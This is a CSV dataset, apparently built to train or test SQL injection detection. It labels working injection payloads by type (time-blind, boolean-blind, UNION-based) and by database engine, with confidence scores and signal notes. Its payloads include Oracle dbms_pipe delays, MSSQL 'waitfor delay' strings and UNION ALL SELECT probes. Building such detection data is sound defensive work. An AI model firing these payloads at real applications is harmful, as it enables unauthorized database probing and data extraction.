id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19647,"1 ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
19708,"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 4959 = 4959",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
19783,"1%"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
19653,"1 ) ) as fmpr where 3103 = 3103 and elt ( 9970 = 9297,9297 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
19668,1' waitfor delay '0:0:5' and 'jree' = 'jree,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
19706,1%' ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
19748,"waitfor delay '0:0:5' and ( ""%"" = """,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
19751,"waitfor delay '0:0:5' and ( ( ( ""lpeo"" = ""lpeo",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
19600,1 ) ) and 3228 = 7376#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
19601,"1 ) where 9645 = 9645 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
19606,"-6656"" ) union all select 3931#",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
19615,"-9774' ) ) ) union all select 6954,6954,6954#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
19622,"-7700%' ) union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
19623,"1 ) as pcnd where 4589 = 4589 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 98 chars.,2
19626,"-9574%' ) ) union all select 5645,5645,5645,5645,5645,5645,5645--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
